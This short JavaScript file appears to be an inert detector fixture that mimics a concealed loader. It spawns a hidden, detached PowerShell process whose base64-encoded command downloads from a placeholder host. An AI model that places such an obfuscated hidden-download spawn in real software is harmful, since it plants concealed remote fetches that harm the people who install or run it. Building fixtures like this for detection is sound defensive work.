// REDACTED replica of the concealed-loader shape: nothing about the payload is
// visible in the source — no URL, no secret name, no network API — because the
// command is a base64 blob handed to an interpreter. Concealment IS the signal.
// Inert fixture, never executed.
const { spawn } = require("child_process");

const blob =
  "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL1JFREFDVEVELmV4YW1wbGUvcA==";

spawn("powershell.exe", ["-WindowStyle", "Hidden", "-EncodedCommand", blob], {
  detached: true,
  stdio: "ignore",
}).unref();
